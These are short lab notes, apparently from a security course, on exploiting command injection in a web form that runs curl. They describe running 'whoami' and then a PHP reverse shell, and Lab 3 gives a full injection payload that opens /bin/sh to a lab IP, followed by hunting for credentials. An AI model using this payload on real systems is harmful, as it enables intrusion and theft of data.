Resorce: [Click Me](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

When any input passed is executed as command in shell, it can be used to perform injection attack by payloading the input to some malicious command.
Example:
![f38abb0b8bf3e5dcc8b5d2e8d86318cf.png](../_resources/f38abb0b8bf3e5dcc8b5d2e8d86318cf.png)
Above takes url input and displays result of HTTP request.

***Now, we can tweak this functionality for command injection***
![f4c9cf6fd298d78a158ddcdb2560354e.png](../_resources/f4c9cf6fd298d78a158ddcdb2560354e.png)
This results in output of 'whoami' in last

Terminating curl command so that it can be visible directly.
![5e078b27accf990bed4e3966f8d48b26.png](../_resources/5e078b27accf990bed4e3966f8d48b26.png)

***It can be used to chain other commands like gaining reverse shell, etc.***

PHP Reverse Shell:  [Link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

Injecting php reverse shell cmd with input:
![9f882847cc109254b9739607fbbb847c.png](../_resources/9f882847cc109254b9739607fbbb847c.png)

Got reverse shell
![43970ac21556b592d55d274bac1e4156.png](../_resources/43970ac21556b592d55d274bac1e4156.png)
Now, it can be used to look for config files for keys, credentials, privilege excalation, etc
![18017f8e2774eac6a1151be17f501429.png](../_resources/18017f8e2774eac6a1151be17f501429.png)

### Lab2:
![732106090dcc030c1f9764bb21f4fe4c.png](../_resources/732106090dcc030c1f9764bb21f4fe4c.png)
![10cfaa5445efc0485677be1fe1ade068.png](../_resources/10cfaa5445efc0485677be1fe1ade068.png)

### Lab 3:
Normal functionality:
![e6c9752906fc018ec91779ed6a3608df.png](../_resources/e6c9752906fc018ec91779ed6a3608df.png)

**CMD Injection:**
In X Field: `30))}';php -r '$sock=fsockopen("10.0.2.15",4244);exec("/bin/sh -i <&3 >&3 2>&3");';#`
![8954f6f040c9de7e11231763e9da5a40.png](../_resources/8954f6f040c9de7e11231763e9da5a40.png)
![253576eb0f4adcf9e13d9c3876e8c1ca.png](../_resources/253576eb0f4adcf9e13d9c3876e8c1ca.png)